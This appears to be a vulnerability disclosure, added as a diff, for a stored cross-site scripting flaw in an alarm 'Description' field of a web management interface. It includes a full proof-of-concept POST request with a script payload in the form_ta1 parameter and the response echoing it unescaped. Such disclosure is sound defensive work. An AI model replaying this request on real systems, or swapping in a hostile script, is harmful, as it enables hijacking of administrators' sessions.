@@ -1,0 +1,57 @@
+An authenticated malicious actor can edit an already existing alarm (or create an alarm) and insert a malicious XSS payload in the "Description" field ("form_ta1" parameter), and then save the changes. Then, every time the "/state/alarmstate" is visited the malicious payload is executed. This would result in privilege escalation or unauthorized actions execution in the context of the privileges user (e.g. admin).
+
+User Input Sanitization should be implemented for fixing this issue.
+
+Below, evidence is provided.
+
+
+Malicious Request:
+POST /objectdetails?id=11111111 HTTP/1.1
+Host: 1.1.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 149
+Origin: http://1.1.1.1
+DNT: 1
+Connection: close
+Referer: http://1.1.1.1/objectdetails?id=11111111
+Cookie: ksp=1662042470310987164
+Upgrade-Insecure-Requests: 1
+
+ksp_formID=form2&ksp_requestID=1&form_ta1=something%3Cscript%3Ealert%281%29%3C%2Fscript%3E&ksp_redirect=%2Finstallationview%2Fasbusy&x=1&y=1
+
+
+
+Response:
+HTTP/1.0 200 OK
+Connection: close
+Content-Type: text/html
+Cache-Control: no-cache
+Pragma: no-cache
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"> 
+ 
+<head>
+
+.........code..........
+.......................
+
+<td class="property-name">Description</td>
+
+<td class="property-value">
+
+
+
+
+<textarea name="form_ta1" cols="23" style="width:210px;height:55px;" rows="4">something<script>alert(1)</script></textarea> 
+
+
+.........code..........
+.......................
+
+</html>
